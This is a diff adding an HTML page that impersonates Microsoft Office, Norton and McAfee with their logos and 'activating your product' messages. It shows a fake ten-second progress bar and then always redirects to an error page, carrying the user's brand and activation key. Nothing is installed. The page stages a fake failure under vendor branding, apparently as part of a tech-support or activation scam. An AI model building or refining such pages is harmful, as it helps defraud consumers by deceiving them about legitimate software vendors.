@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            primary: '#0078d4',
+                            dark: '#0b2447',
+                            light: '#e8f3fc'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .gradient-bg {
+            background: #ffffff;
+        }
+        .card-glass {
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        }
+        @keyframes rotate-loader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loader-ring {
+            border: 4px solid rgba(0,0,0,0.08);
+            border-top: 4px solid #0078d4;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: rotate-loader 1s linear infinite;
+        }
+        .progress-bar {
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body class="min-h-screen gradient-bg bg-white text-gray-900">
+    <div class="relative z-10 min-h-screen flex items-center justify-center px-4">
+        <div class="max-w-md w-full text-center">
+            <!-- Brand Logo -->
+            <div class="flex items-center justify-center mb-8 relative">
+                <div class="loader-ring relative z-10 flex items-center justify-center">
+                    <i id="loadingIcon" class="fa-brands fa-windows text-3xl"></i>
+                </div>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="w-full bg-gray-200 rounded-full h-2 mb-4 overflow-hidden">
+                <div id="progressBar" class="progress-bar bg-blue-400 h-2 rounded-full" style="width: 0%"></div>
+            </div>
+
+            <p class="text-gray-400 text-xs">Don't close this window</p>
+        </div>
+    </div>
+
+    <script>
+        const brandConfig = {
+            microsoft: {
+                icon: 'fa-brands fa-windows',
+                title: 'Installing...',
+                subtitle: 'Please wait while we activate your product',
+                progressColor: 'bg-blue-400',
+                gradientFrom: '#0b2447',
+                gradientMid: '#1a3a6a',
+                gradientTo: '#0078d4',
+                loaderColor: '#0078d4',
+                errorPath: 'error.html'
+            },
+            norton: {
+                icon: 'fa-solid fa-shield-halved',
+                title: 'Installing...',
+                subtitle: 'Please wait while we activate your security product',
+                progressColor: 'bg-green-400',
+                gradientFrom: '#0a2a1a',
+                gradientMid: '#1a4a2a',
+                gradientTo: '#00b050',
+                loaderColor: '#00b050',
+                errorPath: 'error.html'
+            },
+            mcafee: {
+                icon: 'fa-solid fa-shield-halved',
+                title: 'Installing...',
+                subtitle: 'Please wait while we activate your security product',
+                progressColor: 'bg-red-400',
+                gradientFrom: '#2a0a0a',
+                gradientMid: '#4a1212',
+                gradientTo: '#c01818',
+                loaderColor: '#c01818',
+                errorPath: 'error.html'
+            }
+        };
+
+        let brand = 'microsoft';
+        let activationKey = '';
+        const params = new URLSearchParams(window.location.search);
+        brand = params.get('brand') || sessionStorage.getItem('detectedBrand') || 'microsoft';
+        activationKey = params.get('key') || sessionStorage.getItem('detectedActivationKey') || 'XXXXX-XXXXX-XXXXX-XXXXX';
+        sessionStorage.setItem('detectedBrand', brand);
+        sessionStorage.setItem('detectedActivationKey', activationKey);
+        const config = brandConfig[brand] || brandConfig.microsoft;
+
+        // Keep background white on all pages
+        document.querySelector('.gradient-bg').style.background = '#ffffff';
+
+        // Show brand logo (static) instead of spinning icon
+        const ringBox = document.querySelector('.loader-ring');
+        ringBox.style.animation = 'none';
+        ringBox.style.border = 'none';
+        ringBox.style.width = '100%';
+        if (brand === 'microsoft') {
+            ringBox.innerHTML = '<img id="loadingIcon" src="assets/microsoft-office-logo.svg" onerror="this.onerror=null;this.src=\'assets/microsoft-office.jpg\'" alt="Microsoft Office" class="w-full h-auto object-contain">';
+        } else if (brand === 'mcafee') {
+            ringBox.innerHTML = '<img id="loadingIcon" src="assets/mcafee-logo.svg" alt="McAfee" class="w-full h-auto object-contain">';
+        } else {
+            ringBox.innerHTML = '<img id="loadingIcon" src="assets/norton-logo.svg" onerror="this.onerror=null;this.src=\'assets/norton-logo.png\'" alt="Norton" class="w-full h-auto object-contain">';
+        }
+        document.getElementById('progressBar').className = 'progress-bar ' + config.progressColor + ' h-2 rounded-full';
+
+        // Animate progress over exactly 10 seconds, then go to error page
+        const DURATION = 10000;
+        const startTime = Date.now();
+        const progressBar = document.getElementById('progressBar');
+
+        const progressInterval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            let progress = Math.min((elapsed / DURATION) * 100, 100);
+            progressBar.style.width = progress + '%';
+
+            if (progress >= 100) {
+                clearInterval(progressInterval);
+                window.location.href = 'error.html?brand=' + brand + '&key=' + encodeURIComponent(activationKey);
+            }
+        }, 100);
+    </script>
+</body>
+</html>
